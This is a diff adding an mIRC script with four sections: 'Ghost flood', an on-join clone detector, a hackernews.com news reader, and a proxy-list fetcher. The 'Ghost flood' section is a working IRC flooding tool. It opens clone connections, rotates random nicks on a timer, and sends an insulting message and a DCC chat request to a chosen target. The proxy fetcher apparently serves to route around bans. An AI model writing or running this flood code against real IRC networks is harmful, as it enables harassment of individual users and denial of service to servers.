@@ -1,0 +1,177 @@
+;                                   ========================================
+;                                                     ### Ghost flood ###
+;                                   ========================================
+alias ghost-flood { sockopen  ghost-flood $+ $r(1,99999) %ghost.flood.serv $port }
+alias ghost-null { if ($sock(ghost-flood*,0) = 0) { halt } }
+alias ghost-nick {
+  ghost-null 
+  .sockwrite -n ghost-flood* nick $rand(a,z) $+ $rand(A,Z) $+ $rand(1,9) $+ $rand(1,9)
+}
+
+alias ghost {  
+  ghost-null 
+  .ghost-nick
+  .sockwrite -n ghost-flood* PRIVMSG %target : Big lammer, suck this words..
+  /raw -q  /dcc chat %target
+}
+
+on 1:sockopen:ghost-flood*: {
+  if ($sockerr > 0) { 
+    sockclose $sockname
+    halt    
+  }
+  .sockwrite -n $sockname user user $r(a,z) $+ $r(a,z) $+ $r(a,z) "freeBSD.org" " $+ $server $+ " :www.freeBSD.org
+  .sockwrite -n $sockname nick $read $mircdir\system\text\wordlist.txt
+  .timer89893 0 20 ghost-nick
+}
+alias kill-ghost-flood {
+  sockclose ghost-flood*
+  echo -a ghost flood client is dead..
+}
+;          =============================
+;              ### on join Clone detector ###
+;          =============================
+alias addon.cloneoj {
+  if (($1 isnum) && ($2 isnum)) {
+    halt
+  }
+  if ($1) {
+    unset %cloneoj.x 
+    :z 
+    inc %cloneoj.x
+    set %cloneoj.clone $address($nick($2,%cloneoj.x),2)
+    if (%cloneoj.clone == $null) { if (%cloneoj.foundclones) goto cl.foundclones 
+      unset %cloneoj.x %cloneoj.isclone %cloneoj.foundclones 
+    return $false }
+    if (%cloneoj.clone == $address($1,2)) { if ($nick($2,%cloneoj.x) == $1) goto z 
+      if (%cloneoj.isclone) { set %cloneoj.isclone %cloneoj.isclone $+ , $nick($2,%cloneoj.x) 
+      set %cloneoj.foundclones yes } 
+      else { set %cloneoj.isclone %cloneoj.isclone $nick($2,%cloneoj.x) 
+    set %cloneoj.foundclones yes } }
+    goto z
+    :cl.foundclones 
+    echo $2 $addon.cloneoj.echo($2,$1,$3,$mid($address($1,2),4,$calc($len($address($1,2)) - 3)),%cloneoj.isclone) 
+    unset %cloneoj.x %cloneoj.isclone %cloneoj.foundclones 
+    return $true
+  }
+}
+on ^*:join:#:{ if ($nick == $me) goto x 
+  if ($addon.cloneoj($nick,$chan,$remove($address,!,~,*))) halt 
+  :x
+}
+alias addon.cloneoj.echo { 
+  ;splay $mircdir\sounds\notice.wav
+  return $+ $addon.cloneoj.cols 10*** $2 ( $+ $3 $+ ) has joined $1 0,14CLONE FOUND!1,15   mask:14 $+ $4  1nicks:14 $5- 
+}
+
+;          =============================
+;                          ### News ###
+;          =============================
+
+alias news {
+  window -dok +el @HackerNews 80 130 700 400 Arial 11
+  background -p @hackernews system/sod01.bmp
+  retr79 www.hackernews.com /index.html
+  aline @HackerNews 1Warning: 14Must be connect to internet to get news..
+  aline @HackerNews 14-=[loading..]=- 
+}
+alias retr79 {
+  set %host79 $1
+  set %get79 $2
+  set %switch $3
+  set %tempHref a href=
+  unset %t
+  if ($1 == www.nic.mx) { set %get79 $2 $+ $4 }
+  unset %newscnt
+  unset %init79
+  unset %sockbr79
+  write -c system\log.tmp
+  window -h @Retrieving 0 0 0 0
+  sockopen snews %host79 80
+}
+on 1:sockopen:snews:{
+  sockwrite -tn snews GET %get79
+}
+on 1:sockread:snews: {
+  if (%host79 == www.hackernews.com) {
+    :next
+    sockread %temp
+    if (-- Begin Day -- isin %temp) { set %log779 yes }
+    if (-- End Day -- isin %temp) unset %log779
+    if (%log779 != yes) goto end
+    if ($sockbr = 0) { goto end }
+    set %t %t $replace($replace($replace($replace($replace($replace(%temp,</title>,^</title>),<li,* <li),<p,<X),<br,<X),<tr,<X),<hr, [ $str(-,70) ] <X )
+    :nextline
+    if ( !isin %t) { goto endlines }
+    filterk $gettok(%t,1,15)
+    set %t $gettok(%t,2-,15)
+    goto nextline
+    :endlines
+    goto next
+    :end
+  }
+  if (%host79 != www.hackernews.com) {
+    :nextread
+    inc %newscnt
+    sockread -fn %html79
+    if (%switch isin %html79) { set %init79 yes }
+    if (%init79 == yes) { write terrahack\log.tmp %html79 }
+    if (%newscnt == 70) { goto endnotice }
+    echo @Retrieving %html79
+    if (%host79 == www.checkdomain.com) { .timer3379 off | .timer3379 1 1 replace79 }
+    goto nextread
+    :endnotice
+    window -c @Retrieving
+    sockclose snews
+    if (%host79 == attrition.org) defprint1
+    if (%host79 == www.delorie.com) proxierep
+    unset %host79
+    unset %get79
+    unset %switch
+  }
+}
+alias filterk {
+  set %t2 ^ $+ $replace($1-,><,>^<) $+ ^
+  set %t2 $replace($replace(%t2,<A href,-[ 14<a href),</A>,</a>)
+  set %t2 $replace($replace(%t2,<B>,),</B>,)
+  set %t2 $replace(%t2,ALT=",>^<IMG_ALT ")
+  set %t2 $replace(%t2,>,<)
+  :next
+  if (< !isin %t2) { goto end }
+  elseif ($left($gettok(%t2,2,60),7) = %tempHref) { set %tFile $remove($gettok($remove($gettok(%t2,2,60),a href=),1,32),") }
+  if ($gettok(%t2,2,60) = /a) { set %t2 $gettok(%t2,1,60) 14 %tFile ]- $gettok(%t2,3-,60) }
+  elseif ($gettok($gettok(%t2,2,60),1,32) = IMG_ALT) { set %t2 $gettok(%t2,1,60) 12[ $+ $gettok($gettok(%t2,2,60),2,34) $+ ] $gettok(%t2,3-,60) }
+  else { set %t2 $gettok(%t2,1,60) $+ $gettok(%t2,3-,60) }
+  goto next
+  :end
+  set %t2 $replace($replace(%t2,&quot;,"),&nbsp;,$chr(160))
+  set %t2 $replace($replace(%t2,&lt;,<),&gt;,>)
+  echo @HackerNews  $+ $remove(%t2,^)
+}
+;          =============================
+;                          ### Proxy List ###
+;          =============================
+
+alias proxiex {
+  set %retriever6 Proxy 
+  set %get79 /web/lynxview.cgi?url=http%3A%2F%2Fwww.cyberarmy.com%2Flists%2F $+ $1
+  set %host79 www.delorie.com
+  set %switch <b>
+  window -dok +el @Proxies 200 150 300 400 Arial 11
+  echo @proxies -[ Loading... ]-
+  retr79 %host79 %get79 %switch
+}
+alias proxierep {
+  if ($1 == beginner) goto beginner
+  clear @proxies
+  echo @proxies  %retriever6     -     Port
+  unset %repcount
+  :beginner
+  inc %repcount
+  if (%repcount == 35) { unset %retriever6 | halt }
+  set %rep $read -l $+ %repcount 
+  set %rep2 $replace(%rep,<b>,$chr(32),</b>,$chr(32))
+  if ([ isin %rep2) { prxrep %rep2 }
+  goto beginner
+}
+alias prxrep { echo @proxies [×] $1 - $3 | proxierep beginner }
